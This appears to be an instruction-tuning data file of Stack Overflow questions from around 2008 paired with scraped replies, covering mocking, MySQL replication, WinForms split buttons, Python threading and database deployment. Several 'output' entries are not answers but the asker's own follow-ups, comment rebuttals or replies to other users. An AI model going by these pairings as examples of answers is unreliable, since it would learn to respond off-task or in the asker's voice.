{"instruction": "So I'm working on some legacy code that's heavy on the manual database operations. I'm trying to maintain some semblance of quality here, so I'm going TDD as much as possible.\nThe code I'm working on needs to populate, let's say a List<Foo> from a DataReader that returns all the fields required for a functioning Foo. However, if I want to verify that the code in fact returns one list item per one database row, I'm writing test code that looks something like this:\nExpect.Call(reader.Read()).Return(true);\nExpect.Call(reader[\"foo_id\"]).Return((long) 1);\n// ....\nExpect.Call(reader.Read()).Return(true);\nExpect.Call(reader[\"foo_id\"]).Return((long) 2);\n// ....\nExpect.Call(reader.Read()).Return(false);\n\nWhich is rather tedious and rather easily broken, too. \nHow should I be approaching this issue so that the result won't be a huge mess of brittle tests?\nBtw I'm currently using Rhino.Mocks for this, but I can change it if the result is convincing enough. Just as long as the alternative isn't TypeMock, because their EULA was a bit too scary for my tastes last I checked.\nEdit: I'm also currently limited to C# 2.", "output": "I thought about posting some code and then I remembered about JP Boodhoo's Nothin But .NET course.  He has a sample project that he is sharing that was created during one of his classes.  The project is hosted on Google Code and it is a nice resource.  I am sure it has some nice tips for you to use and give you ideas on how to refactor the mapping.  The whole project was built with TDD."}
{"instruction": "I can connect with the DataContext to the Oracle database however I get errors in running the query against the oracle database.  I looked at the SQL generated and it is for MSSQL and not Oracle PSQL.  \nDoes anybody know of a decent easy to use wrapper to use LINQ against an Oracle Database?", "output": "Do look at Linq to entities though.  I have a datareader populate a collection of objects that are mapped to the oracle table.  I can use linq to query that collection in very powerful, simple, and easy ways.  I love it.  Highly recommend."}
{"instruction": "I'm running a master-slave MySQL binary log replication system (phew!) that, for some data, is not in sync (meaning, the master holds more data than the slave). But the slave stops very frequently on the slightest MySQL error, can this be disabled? (perhaps a my.cnf setting for the replicating slave ignore-replicating-errors or some of the sort ;) )\nThis is what happens, every now and then, when the slave tries to replicate an item that does not exist, the slave just dies. a quick check at SHOW SLAVE STATUS \\G; gives\n       Slave-IO-Running: Yes\n      Slave-SQL-Running: No\n        Replicate-Do-DB: \n             Last-Errno: 1062\n             Last-Error: Error 'Duplicate entry '15218' for key 1' on query. Default database: 'db'. Query: 'INSERT INTO db.table ( FIELDS ) VALUES ( VALUES )'\n\nwhich I promptly fix (once I realize that the slave has been stopped) by doing the following:\nSTOP SLAVE;\nRESET SLAVE;\nSTART SLAVE;\n\n... lately this has been getting kind of tiresome, and before I spit out some sort of PHP which does this for me, i was wondering if there's some my.cnf entry which will not kill the slave on the first error.\nCheers,\n/mp", "output": "Yes, with --slave-skip-errors=xxx in my.cnf, where xxx is 'all' or a comma sep list of error codes."}
{"instruction": "Yes, it sounds crazy....It might be.\nThe final updatepanel does not appear to trigger anything, it just refreshes the update panels and does not call back to the usercontrol hosting it.\nAny ideas?\nEDIT: I got it posting back, however the controls inside the final usercontrol have lost their data...I'm thinking its because the main repeater is rebinding on each postback...Not sure where to take this one now.", "output": "I would suggest you start by removing the UpdatePanels at first, and make sure your control orgy is working correctly with postbacks.  Once you have that working, try adding the UpdatePanels back in from the bottom up."}
{"instruction": "The first time I load the website in the production web server, it start very slow, subsequent pages load very quickly (included the home page).\nI precompiled the site, but nothing changes. \nI don't have any code at Application start.\nI don't have cached items.\nAny ideas? How can I find out what is happening?", "output": "@Mickey: No, it is turned off. Do I need to turn it on to find out?\n\nThe trace log will show you how long each action takes.  It could help you find what is taking so long.\nHere is a link that might help you get it setup."}
{"instruction": "Until recently I've been using syslog in my System_Exception exception handler to log important errors - a pretty useful concept I thought. However my host just cut me off, and it appears that loveable syslog has actually been sending my error reports to everyone on the server (it's a shared server). They weren't too pleased.\nI've now switched to using a log.txt (and will now have to secure this with chmod or something) - but does anyone have any other suggestions for me to try? This seems a bit rusty.\nOh, and don't use syslog on anything except a dedicated server or somewhere that can handle it ;-)", "output": "I like to log minor stuff to a database (if it's possible without slowing things down a lot).  It makes it easier to go back and condense results from the log.\nFor fatal errors, I try to pipe them into FogBugz using ScoutSubmit"}
{"instruction": "Until recently I've been using syslog in my System_Exception exception handler to log important errors - a pretty useful concept I thought. However my host just cut me off, and it appears that loveable syslog has actually been sending my error reports to everyone on the server (it's a shared server). They weren't too pleased.\nI've now switched to using a log.txt (and will now have to secure this with chmod or something) - but does anyone have any other suggestions for me to try? This seems a bit rusty.\nOh, and don't use syslog on anything except a dedicated server or somewhere that can handle it ;-)", "output": "Try log4php. I'm using log4net for my .NET project and it's just terrific. :)"}
{"instruction": "Until recently I've been using syslog in my System_Exception exception handler to log important errors - a pretty useful concept I thought. However my host just cut me off, and it appears that loveable syslog has actually been sending my error reports to everyone on the server (it's a shared server). They weren't too pleased.\nI've now switched to using a log.txt (and will now have to secure this with chmod or something) - but does anyone have any other suggestions for me to try? This seems a bit rusty.\nOh, and don't use syslog on anything except a dedicated server or somewhere that can handle it ;-)", "output": "I use log4net.  Great tool.  It can output logs to files, database, emails, UDP, etc.\nPersonally, I output to files with the rolling File Appender.  It makes reviewing logs very simple."}
{"instruction": "This error just started popping up all over our site.\nPermission denied to call method to Location.toString\nI'm seeing google posts that suggest that this is related to flash and our crossdomain.xml.  What caused this to occur and how do you fix?", "output": "This likely causeed by a change made in the Flash Player version released in early April, I'm not too sure about the specifics, but I assume there were security concerns with this functionality.\nWhat you need to do is indeed add that to your crossdomain.xml (which should be in your servers webroot)\nYou can read more here: http://www.adobe.com/devnet/flashplayer/articles/flash_player9_security_update.html\nA typical example of a crossdomain.xml is twitters, more info about how the file works can be found here."}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "Maybe a bonnet, lap or a tree is not a chair but they all are ISittable.\n\nYes, but only ex post facto. They're ISittable because someone sat on them."}
{"instruction": "The \"Open\" button on the open file dialog used in certain windows applications includes a dropdown arrow with a list of additional options -- namely \"Open with..\".  \nI haven't seen this in every windows application, so you may have to try a few to get it, but SQL Server Management Studio and Visual Studio 2005 will both show the button that way if you go to the menu and choose File->Open->File...\nI want to use a button like this with a built-in list in one of my applications, but I can't find the control they're using anywhere in visual studio.  I should clarify that I'm looking for that specific button, not the entire dialog.  Any thoughts?", "output": "I don't think there's a built-in control that can do it in .NET.  I'm poking around in the MSDN documentation for the standard Windows Button control, but it doesn't look like it's there.\nI did find a Code Project article with a custom implementation; this might help a little."}
{"instruction": "Pretty much every other editor that isn't a vi descendant (vim, cream, vi-emu) seems to use the emacs shortcuts (ctrl+w to delete back a word and so on)", "output": "I recently came across divascheme - an alternative set of key bindings for DrScheme.  This is modal, and part of the justification is to do with RSI - specifically avoiding lots of wrist twisting to hit Ctrl-Alt-Shift-something.  The coder has done an informal survey of fellow coders and found that emacs users suffered from more wrist pain than vi coders.\nYou can see him doing a short talk at LugRadio Live USA.  (The video is a series of 5 minute talks and I can't remember how far through it is, sorry - if someone watches it and posts that here I'll edit this post to say when in the video it is).\nNote I have not used divascheme."}
{"instruction": "The \"Open\" button on the open file dialog used in certain windows applications includes a dropdown arrow with a list of additional options -- namely \"Open with..\".  \nI haven't seen this in every windows application, so you may have to try a few to get it, but SQL Server Management Studio and Visual Studio 2005 will both show the button that way if you go to the menu and choose File->Open->File...\nI want to use a button like this with a built-in list in one of my applications, but I can't find the control they're using anywhere in visual studio.  I should clarify that I'm looking for that specific button, not the entire dialog.  Any thoughts?", "output": "I've not familiar with using either of these, but try searching msdn for splitbutton or dropdownbutton.  I think those are similar to what you're looking for."}
{"instruction": "A number of forms in my project inherit from a base form. It is easy to get at the Controls collection of the derived forms, but I have not found a simple way to access the Components collection, since VS marks this as private. \nI assume this could be done with reflection, but I'm not really sure how best to go about it, not having worked with reflection before.\nRight now, I'm using a sort of clunky workaround, in which I override a function GetComponents and return an array of the components I'm interested in. This is obviously prone to errors, since it's easy to forget to implement the overridden function or update it when components are added.\nIf anyone has any tips or can suggest a better way, I'd be glad to hear.", "output": "If you're worried about forgetting to override the function, then make it abstract."}
{"instruction": "The \"Open\" button on the open file dialog used in certain windows applications includes a dropdown arrow with a list of additional options -- namely \"Open with..\".  \nI haven't seen this in every windows application, so you may have to try a few to get it, but SQL Server Management Studio and Visual Studio 2005 will both show the button that way if you go to the menu and choose File->Open->File...\nI want to use a button like this with a built-in list in one of my applications, but I can't find the control they're using anywhere in visual studio.  I should clarify that I'm looking for that specific button, not the entire dialog.  Any thoughts?", "output": "I think what you are looking for is called a toolStripSplitButton. It is only available in a toolStrip. But you can add a toolStripContainer anywhere on your form and then put the toolStrip and toolStripSplitButton inside your container. \nYou won't want to show the grips so you'll want to set your gripMargin = 0. You can also set your autosize=true so that the toolstrip conforms to your button.  The button will just look like a normal button (except for the split part) on your form."}
{"instruction": "The \"Open\" button on the open file dialog used in certain windows applications includes a dropdown arrow with a list of additional options -- namely \"Open with..\".  \nI haven't seen this in every windows application, so you may have to try a few to get it, but SQL Server Management Studio and Visual Studio 2005 will both show the button that way if you go to the menu and choose File->Open->File...\nI want to use a button like this with a built-in list in one of my applications, but I can't find the control they're using anywhere in visual studio.  I should clarify that I'm looking for that specific button, not the entire dialog.  Any thoughts?", "output": "Since I found the control in Windows itself, I was hoping to find it built-in somewhere already so I didn't have to add anything to my code-base to use it.  But the split button at this link (found via the msdn suggestion) looks pretty promising.\nI'll try it later myself, but I don't know how well it will handle visual styles."}
{"instruction": "The \"Open\" button on the open file dialog used in certain windows applications includes a dropdown arrow with a list of additional options -- namely \"Open with..\".  \nI haven't seen this in every windows application, so you may have to try a few to get it, but SQL Server Management Studio and Visual Studio 2005 will both show the button that way if you go to the menu and choose File->Open->File...\nI want to use a button like this with a built-in list in one of my applications, but I can't find the control they're using anywhere in visual studio.  I should clarify that I'm looking for that specific button, not the entire dialog.  Any thoughts?", "output": "Here's my split button implementation.  It does not draw the arrow, and the focus/unfocus behavior is a little different.\nBoth mine and the originals handle visual styles and look great with Aero.\nBased on http://wyday.com/splitbutton/\nusing System;\nusing System.Collections.Generic;\nusing System.Text;\nusing System.Windows.Forms;\nusing System.Windows.Forms.VisualStyles;\nusing System.Drawing;\nusing System.ComponentModel;\nusing System.Diagnostics;\n\n// Original: http://blogs.msdn.com/jfoscoding/articles/491523.aspx\n// Wyatt's fixes: http://wyday.com/splitbutton/\n// Trimmed down and redone significantly from that version (Nick 5/6/08)\nnamespace DF\n{\n    public class SplitButton : Button\n    {\n        private ContextMenuStrip m_SplitMenu = null;\n        private const int SplitSectionWidth = 14;\n        private static int BorderSize = SystemInformation.Border3DSize.Width * 2;\n        private bool mBlockClicks = false;\n        private Timer mTimer;\n\n        public SplitButton()\n        {\n            this.AutoSize = true;\n            mTimer = new Timer();\n            mTimer.Interval = 100;\n            mTimer.Tick += new EventHandler(mTimer_Tick);\n        }\n\n        private void mTimer_Tick(object sender, EventArgs e)\n        {\n            mBlockClicks = false;\n            mTimer.Stop();\n        }\n\n        #region Properties\n        [DefaultValue(null)]\n        public ContextMenuStrip SplitMenu\n        {\n            get\n            {\n                return m_SplitMenu;\n            }\n            set\n            {\n                if (m_SplitMenu != null)\n                    m_SplitMenu.Closing -= \n                        new ToolStripDropDownClosingEventHandler(m_SplitMenu_Closing);\n\n                m_SplitMenu = value;\n\n                if (m_SplitMenu != null)\n                    m_SplitMenu.Closing += \n                        new ToolStripDropDownClosingEventHandler(m_SplitMenu_Closing);\n            }\n        }\n\n        private void m_SplitMenu_Closing(object sender, ToolStripDropDownClosingEventArgs e)\n        {\n            HideContextMenuStrip();\n            // block click events for 0.5 sec to prevent re-showing the menu\n\n        }\n\n        private PushButtonState _state;\n        private PushButtonState State\n        {\n            get\n            {\n                return _state;\n            }\n            set\n            {\n                if (!_state.Equals(value))\n                {\n                    _state = value;\n                    Invalidate();\n                }\n            }\n        }\n\n        #endregion Properties\n\n        protected override void OnEnabledChanged(EventArgs e)\n        {\n            if (Enabled)\n                State = PushButtonState.Normal;\n            else\n                State = PushButtonState.Disabled;\n\n            base.OnEnabledChanged(e);\n        }\n\n        protected override void OnMouseClick(MouseEventArgs e)\n        {\n            if (e.Button != MouseButtons.Left)\n                return;\n            if (State.Equals(PushButtonState.Disabled))\n                return;\n            if (mBlockClicks)\n                return;\n\n            if (!State.Equals(PushButtonState.Pressed))\n                ShowContextMenuStrip();\n            else\n                HideContextMenuStrip();\n        }\n\n        protected override void OnMouseEnter(EventArgs e)\n        {\n            if (!State.Equals(PushButtonState.Pressed) && !State.Equals(PushButtonState.Disabled))\n            {\n                State = PushButtonState.Hot;\n            }\n        }\n\n        protected override void OnMouseLeave(EventArgs e)\n        {\n            if (!State.Equals(PushButtonState.Pressed) && !State.Equals(PushButtonState.Disabled))\n            {\n                if (Focused)\n                {\n                    State = PushButtonState.Default;\n                }\n\n                else\n                {\n                    State = PushButtonState.Normal;\n                }\n            }\n        }\n\n        protected override void OnPaint(PaintEventArgs pevent)\n        {\n            base.OnPaint(pevent);\n\n            Graphics g = pevent.Graphics;\n            Rectangle bounds = this.ClientRectangle;\n\n            // draw the button background as according to the current state.\n            if (State != PushButtonState.Pressed && IsDefault && !Application.RenderWithVisualStyles)\n            {\n                Rectangle backgroundBounds = bounds;\n                backgroundBounds.Inflate(-1, -1);\n                ButtonRenderer.DrawButton(g, backgroundBounds, State);\n\n                // button renderer doesnt draw the black frame when themes are off =(\n                g.DrawRectangle(SystemPens.WindowFrame, 0, 0, bounds.Width - 1, bounds.Height - 1);\n            }\n            else\n            {\n                ButtonRenderer.DrawButton(g, bounds, State);\n            }\n\n            StringFormat format = new StringFormat();\n            format.Alignment = StringAlignment.Center;\n            format.LineAlignment = StringAlignment.Center;\n\n            g.DrawString(Text, Font, SystemBrushes.ControlText, bounds, format);\n        }\n\n        private void ShowContextMenuStrip()\n        {\n            State = PushButtonState.Pressed;\n            if (m_SplitMenu != null)\n            {\n                m_SplitMenu.Show(this, new Point(0, Height), ToolStripDropDownDirection.BelowRight);\n            }\n        }\n\n        private void HideContextMenuStrip()\n        {\n            State = PushButtonState.Normal;\n            m_SplitMenu.Hide();\n            mBlockClicks = true;\n            mTimer.Start();\n        }\n    }\n}"}
{"instruction": "A number of forms in my project inherit from a base form. It is easy to get at the Controls collection of the derived forms, but I have not found a simple way to access the Components collection, since VS marks this as private. \nI assume this could be done with reflection, but I'm not really sure how best to go about it, not having worked with reflection before.\nRight now, I'm using a sort of clunky workaround, in which I override a function GetComponents and return an array of the components I'm interested in. This is obviously prone to errors, since it's easy to forget to implement the overridden function or update it when components are added.\nIf anyone has any tips or can suggest a better way, I'd be glad to hear.", "output": "If you set the Modifiers property of your components to strict protected makes them accessible without the use of a components collection. \nEdit:\nDiscoverability could be done using reflection to walk over each field. Although that might be suboptimal in your case."}
{"instruction": "What is the content type for MHT files?", "output": "message/rfc822\nRFC 822 - STANDARD FOR THE FORMAT OF ARPA INTERNET TEXT MESSAGES\nHere is a hyperlink: message/rfc822"}
{"instruction": "This isn't much of a programming question, but I'm sure I'm not the only person here who has this issue.\nCurrently I have two machines with Outlook 2007. They both sync e-mail from Google Apps. One of the machines publishes my calendar to a secure server, which my other machine is subscribed to. The problem with this setup is that I have read-only calendar access on one of my machines, which sucks. Also soon I'll be upgrading to a smart-phone, so anything I do will also have to support that scenario.\n\nIs there a better way to handle Outlook synchronization without setting up an exchange server in my basement?\nIf I have to setup Exchange, is it possible to make it pull e-mail, via IMAP, from Google Apps?", "output": "Question 2: Yes. Use your Exchange server as you normally would then add your IMAP email account to Outlook. I have a client that has done this for his office staff and it's been working fine for years."}
{"instruction": "The \"Open\" button on the open file dialog used in certain windows applications includes a dropdown arrow with a list of additional options -- namely \"Open with..\".  \nI haven't seen this in every windows application, so you may have to try a few to get it, but SQL Server Management Studio and Visual Studio 2005 will both show the button that way if you go to the menu and choose File->Open->File...\nI want to use a button like this with a built-in list in one of my applications, but I can't find the control they're using anywhere in visual studio.  I should clarify that I'm looking for that specific button, not the entire dialog.  Any thoughts?", "output": "I used the draggable search in Spy++ (installed with VS) to look at the split open button on the file-open dialog of VS.\nThis revealed that it's an ordinary windows button with a style which includes BS_DEFSPLITBUTTON.   That's a magic keyword which gets you to some interesting places, including\nhttp://www.codeplex.com/windowsformsaero/SourceControl/FileView.aspx?itemId=212902&changeSetId=9930\nand here\nhttp://msdn.microsoft.com/en-us/library/bb775949.aspx#using_splits\nHope this helps you.  \nEDIT:\nI've actually just tried that code from CodePlex and it does create a split button - but you do have to make sure you've set the button's FlatStyle to 'System' rather than 'Standard' which is the default.   I've not bothered to hook-up the event handling stuff for the drop-down, but that's covered in the MSDN link, I think.\nOf course, this is Vista-only (but doesn't need Aero enabled, despite the name on codeplex) - if you need earlier OS support, you'll be back to drawing it yourself."}
{"instruction": "What is the content type for MHT files?", "output": "application/octet-stream\nYou can stream the contents of a .eml file to a browser with this content type and .mht as the extension, and the email will be rendered similar to the way it is rendered in an email client."}
{"instruction": "Unit testing is, roughly speaking, testing bits of your code in isolation with test code. The immediate advantages that come to mind are:\n\nRunning the tests becomes automate-able and repeatable\nYou can test at a much more granular level than point-and-click testing via a GUI\n\nRytmis\n\nMy question is, what are the current \"best practices\" in terms of tools as well as when and where to use unit testing as part of your daily coding?\nLets try to be somewhat language agnostic and cover all the bases.", "output": "Don't forget refactoring support. ReSharper on .NET provides automatic refactoring and quick fixes for missing code. That means if you write a call to something that does not exist, ReSharper will ask if you want to create the missing piece."}
{"instruction": "I've been trying to wrap my head around how threads work in Python, and it's hard to find good information on how they operate. I may just be missing a link or something, but it seems like the official documentation isn't very thorough on the subject, and I haven't been able to find a good write-up.\nFrom what I can tell, only one thread can be running at once, and the active thread switches every 10 instructions or so?\nWhere is there a good explanation, or can you provide one? It would also be very nice to be aware of common problems that you run into while using threads with Python.", "output": "Below is a basic threading sample. It will spawn 20 threads; each thread will output its thread number. Run it and observe the order in which they print.\nimport threading\nclass Foo (threading.Thread):\n    def __init__(self,x):\n        self.__x = x\n        threading.Thread.__init__(self)\n    def run (self):\n          print str(self.__x)\n\nfor x in xrange(20):\n    Foo(x).start()\n\nAs you have hinted at Python threads are implemented through time-slicing. This is how they get the \"parallel\" effect. \nIn my example my Foo class extends thread, I then implement the run method, which is where the code that you would like to run in a thread goes. To start the thread you call start() on the thread object, which will automatically invoke the run method...\nOf course, this is just the very basics. You will eventually want to learn about semaphores, mutexes, and locks for thread synchronization and message passing."}
{"instruction": "What is the best way to profile a controller action in Ruby on Rails. Currently I am using the brute-force method of throwing in puts Time.now calls between what I think will be a bottleneck. But that feels really, really dirty. There has got to be a better way.", "output": "Use the Benchmark standard library and the various tests available in Rails (unit, functional, integration). Here's an example:\ndef test_do_something\n  elapsed_time = Benchmark.realtime do\n    100.downto(1) do |index|\n      # do something here\n    end\n  end\n  assert elapsed_time < SOME_LIMIT\nend\n\nSo here we just do something 100 times, time it via the Benchmark library, and ensure that it took less than SOME_LIMIT amount of time.\nYou also may find these links useful: The Benchmark.realtime reference and the Test::Unit reference. Also, if you're into the 'book reading' thing, I picked up the idea for the example from Agile Web Development with Rails, which talks all about the different testing types and a little on performance testing."}
{"instruction": "I've been wanting to teach myself Lisp for a while.  However, all the interpreters of which I've heard involve some flavor of emacs.\nAre there any command line interpreters, such that I could type this into the command line:\n\nlispinterpret sourcefile.lisp\n\njust like I can run perl or python.\nWhile I'd also like to become more familiar with Emacs (if only not to be frustrated when I work with somebody who uses Emacs), I'd rather decouple learning Emacs from learning Lisp.\nEdit: I actually want to follow SICP which uses Scheme, so an answer about Scheme would be more useful.  I'm just not that familiar with the differences.", "output": "The most widely used IDE for Common Lisp, particularly in the free software subset of the community, is in fact SLIME, which runs on Emacs. You can use whatever CL compiler you prefer and invoke Lisp source files the way you describe, but if you do that, you won't be taking advantage of many of Lisps dynamic features that are so incredibly useful while developing your application.\nI suggest you take a look at this SLIME demonstration video to see what I mean, even though it might be a bit outdated at this point.\nIf the problem is that you (think you) don't like Emacs, I seriously suggest you try to learn it. Seriously. No, really, I mean that. However, there are alternatives, such as the IDEs provided by commercial Lisp implementations such as Allegro and Lispworks (free trials available), or an Eclipse plug-in called Cusp."}
{"instruction": "I've been trying to wrap my head around how threads work in Python, and it's hard to find good information on how they operate. I may just be missing a link or something, but it seems like the official documentation isn't very thorough on the subject, and I haven't been able to find a good write-up.\nFrom what I can tell, only one thread can be running at once, and the active thread switches every 10 instructions or so?\nWhere is there a good explanation, or can you provide one? It would also be very nice to be aware of common problems that you run into while using threads with Python.", "output": "Python's a fairly easy language to thread in, but there are caveats.  The biggest thing you need to know about is the Global Interpreter Lock.  This allows only one thread to access the interpreter.  This means two things:  1)  you rarely ever find yourself using a lock statement in python and 2) if you want to take advantage of multi-processor systems, you have to use separate processes.  EDIT:  I should also point out that you can put some of the code in C/C++ if you want to get around the GIL as well.\nThus, you need to re-consider why you want to use threads.  If you want to parallelize your app to take advantage of dual-core architecture, you need to consider breaking your app up into multiple processes.\nIf you want to improve responsiveness, you should CONSIDER using threads.  There are other alternatives though, namely microthreading.  There are also some frameworks that you should look into:\n\nstackless python\ngreenlets\ngevent\nmonocle"}
{"instruction": "I currently use the following function to do a simple HTTP GET.\npublic static String download(String url) throws java.io.IOException {\n    java.io.InputStream s = null;\n    java.io.InputStreamReader r = null;\n    //java.io.BufferedReader b = null;\n    StringBuilder content = new StringBuilder();\n    try {\n        s = (java.io.InputStream)new URL(url).getContent();\n\n        r = new java.io.InputStreamReader(s);\n        //b = new java.io.BufferedReader(r);\n\n        char[] buffer = new char[4*1024];\n        int n = 0;\n        while (n >= 0) {\n            n = r.read(buffer, 0, buffer.length);\n            if (n > 0) {\n                content.append(buffer, 0, n);\n            }\n        }\n    }\n    finally {\n        //if (b != null) b.close();\n        if (r != null) r.close();\n        if (s != null) s.close();\n    }\n    return content.toString();\n}\n\nI see no reason to use the BufferedReader since I am just going to download everything in sequence. Am I right in thinking there is no use for the BufferedReader in this case?", "output": "You are correct, if you use BufferedReader for reading HTTP content and headers you will want InputStreamReader so you can read byte for byte. \nBufferedReader in this scenario sometimes does weird things...escpecially when it comes to reading HTTP POST headers, sometimes you will be unable to read the POST data, if you use the InputStreamReader you can read the content length and read that many bytes..."}
{"instruction": "I currently use the following function to do a simple HTTP GET.\npublic static String download(String url) throws java.io.IOException {\n    java.io.InputStream s = null;\n    java.io.InputStreamReader r = null;\n    //java.io.BufferedReader b = null;\n    StringBuilder content = new StringBuilder();\n    try {\n        s = (java.io.InputStream)new URL(url).getContent();\n\n        r = new java.io.InputStreamReader(s);\n        //b = new java.io.BufferedReader(r);\n\n        char[] buffer = new char[4*1024];\n        int n = 0;\n        while (n >= 0) {\n            n = r.read(buffer, 0, buffer.length);\n            if (n > 0) {\n                content.append(buffer, 0, n);\n            }\n        }\n    }\n    finally {\n        //if (b != null) b.close();\n        if (r != null) r.close();\n        if (s != null) s.close();\n    }\n    return content.toString();\n}\n\nI see no reason to use the BufferedReader since I am just going to download everything in sequence. Am I right in thinking there is no use for the BufferedReader in this case?", "output": "My gut tells me that since you're already performing buffering by using the byte array, it's redundant to use the BufferedReader."}
{"instruction": "I've been trying to wrap my head around how threads work in Python, and it's hard to find good information on how they operate. I may just be missing a link or something, but it seems like the official documentation isn't very thorough on the subject, and I haven't been able to find a good write-up.\nFrom what I can tell, only one thread can be running at once, and the active thread switches every 10 instructions or so?\nWhere is there a good explanation, or can you provide one? It would also be very nice to be aware of common problems that you run into while using threads with Python.", "output": "Yes, because of the Global Interpreter Lock (GIL) there can only run one thread at a time. Here are some links with some insights about this:\n\nhttp://www.artima.com/weblogs/viewpost.jsp?thread=214235\nhttp://smoothspan.wordpress.com/2007/09/14/guido-is-right-to-leave-the-gil-in-python-not-for-multicore-but-for-utility-computing/\n\nFrom the last link an interesting quote:\n\nLet me explain what all that means. \n  Threads run inside the same virtual\n  machine, and hence run on the same\n  physical machine.  Processes can run\n  on the same physical machine or in\n  another physical machine.  If you\n  architect your application around\n  threads, you\u2019ve done nothing to access\n  multiple machines.  So, you can scale\n  to as many cores are on the single\n  machine (which will be quite a few\n  over time), but to really reach web\n  scales, you\u2019ll need to solve the\n  multiple machine problem anyway.\n\nIf you want to use multi core, pyprocessing defines an process based API to do real parallelization. The PEP also includes some interesting benchmarks."}
{"instruction": "I wonder how you guys manage deployment of a database between 2 SQL Servers, specifically SQL Server 2005.\nNow, there is a development and a live one. As this should be part of a buildscript (standard windows batch, even do with current complexity of those scripts, i might switch to PowerShell or so later), Enterprise Manager/Management Studio Express do not count.\nWould you just copy the .mdf File and attach it? I am always a bit careful when working with binary data, as this seems to be a compatiblity issue (even though development and live should run the same version of the server at all time).\nOr - given the lack of \"EXPLAIN CREATE TABLE\" in T-SQL - do you do something that exports an existing database into SQL-Scripts which you can run on the target server? If yes, is there a tool that can automatically dump a given Database into SQL Queries and that runs off the command line? (Again, Enterprise Manager/Management Studio Express do not count).\nAnd lastly - given the fact that the live database already contains data, the deployment may not involve creating all tables but rather checking the difference in structure and ALTER TABLE the live ones instead, which may also need data verification/conversion when existing fields change.\nNow, i hear a lot of great stuff about the Red Gate products, but for hobby projects, the price is a bit steep.\nSo, what are you using to automatically deploy SQL Server Databases from Test to Live?", "output": "RedGate SqlCompare is a way to go in my opinion. We do DB deployment on a regular basis and since I started using that tool I have never looked back. \nVery intuitive interface and saves a lot of time in the end.\nThe Pro version will take care of scripting for the source control integration as well."}
{"instruction": "I'm working in VS 2008 and have three projects in one solution.  I'm debugging by attaching to a .net process invoked by a third party app (SalesLogix, a CRM app).  \nOnce it has attached to the process and I attempt to set a breakpoint in one of the projects, it doesn't set a breakpoint in that file.  It actually switches the current tab to another file in another project and sets a breakpoint in that document.  If the file isn't open, it even goes so far as to open it for me.  I can't explain this.  I've got no clue.  Anyone seen such odd behavior?  I wouldn't believe it if I wasn't seeing it myself.\nA little more info: if I set a breakpoint before attaching, it shows the \"red dot\" and says no symbols loaded...no problem...I expect that.  When I attach and invoke my .net code from SalesLogix and switch back to VS, my breakpoint is completely gone (not even a warning that the source doesn't match the debug file).  When I attempt to manually load the debug file, then I get a message that the symbol file does not match the module.  The .pdb and the .dll are timestamped the same, so I'm stumped.\nAnyone have any ideas?\nThx,\nJeff", "output": "I saw this functionality in older versions of VS.Net (2003 I think).  It may still exist in current versions, but I haven't encountered it.  Seems that files with the same name, even in different directories confuse VS.Net, and it ends up setting a break point in a file with the same name.  May only happen if the classes in the file both have the same name also.  So much for namespaces I guess.  \nYou also may want to check your build configuration to make sure that all the projects are in fact building in debug mode.  I know I've been caught a couple times when the configuration got changed somehow for the solution, and some projects weren't compiling in debug mode."}
{"instruction": "I'm working in VS 2008 and have three projects in one solution.  I'm debugging by attaching to a .net process invoked by a third party app (SalesLogix, a CRM app).  \nOnce it has attached to the process and I attempt to set a breakpoint in one of the projects, it doesn't set a breakpoint in that file.  It actually switches the current tab to another file in another project and sets a breakpoint in that document.  If the file isn't open, it even goes so far as to open it for me.  I can't explain this.  I've got no clue.  Anyone seen such odd behavior?  I wouldn't believe it if I wasn't seeing it myself.\nA little more info: if I set a breakpoint before attaching, it shows the \"red dot\" and says no symbols loaded...no problem...I expect that.  When I attach and invoke my .net code from SalesLogix and switch back to VS, my breakpoint is completely gone (not even a warning that the source doesn't match the debug file).  When I attempt to manually load the debug file, then I get a message that the symbol file does not match the module.  The .pdb and the .dll are timestamped the same, so I'm stumped.\nAnyone have any ideas?\nThx,\nJeff", "output": "Kibbee, you were right!  It was two files with the same name in different folders.  I was setting the breakpoint in the correct file on line 58 - it was putting the breakpoint on the other file at line 58.  I was finally able to set a breakpoint by using the \"Debug-->New Breakpoint-->Break at Function Name\" menu option and entering my function name.  It stopped exactly like it should have then.  \nI agree - so much for namespaces, right?  Damn thing cost me a couple of hours. Oh, well...at least it's solved and I know why.\nThx for the answer and thx to Matt for his reply, too!"}
{"instruction": "I am trying to get the DB2 data provider from a 32-bit .Net application to connect to DB2 running as a 32-bit application on Vista 64 (is that confusing enough yet)?  Unfortunately, I am getting the following error:\n\nSQL1159 Initialization error with DB2 .NET Data Provider, reason code 7, tokens 9.5.0.DEF.2, SOFTWARE\\IBM\\DB2\\InstalledCopies\n\nThere are several IBM forum posts mentioning it, but little useful guidance.  Has anyone experienced this before?  Or do you have better ideas for fixing it?", "output": "I uninstalled the previous 32bit version, reinstalled as 64bit, and now I get a completely different error.  Its mentioned as requiring FP2 to fix, but since I'm using Express-C, I can't install the fixpack (IBM doesn't provide fixpacks for free DB2 products).  Anyway, thanks for the help.  At least I can come closer to connecting now. :)"}
